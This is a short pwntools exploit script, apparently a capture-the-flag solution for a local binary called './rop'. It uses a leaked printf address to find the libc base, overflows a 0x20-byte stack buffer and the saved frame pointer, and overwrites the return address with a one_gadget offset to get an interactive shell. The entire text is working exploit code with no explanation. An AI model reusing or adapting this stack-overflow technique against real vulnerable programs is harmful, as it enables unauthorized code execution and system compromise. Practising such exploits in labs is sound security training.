from pwn import *

e = ELF("./rop")
libc = e.libc
p = process("./rop")

p.recvuntil(b"printf Function is at: 0x")

printf_addr = int(p.recvline()[:-1], 16)
log.info("printf addr : " + hex(printf_addr))

libc_base = printf_addr - libc.symbols['printf']

onegadget = [0xe3b2e, 0xe3b31, 0xe3b34]
oneshot = libc_base + onegadget[1]

payload = b'A'*0x20         #buf
payload += b'B'*0x8         #sfp
payload += p64(oneshot)

p.sendline(payload)

p.interactive()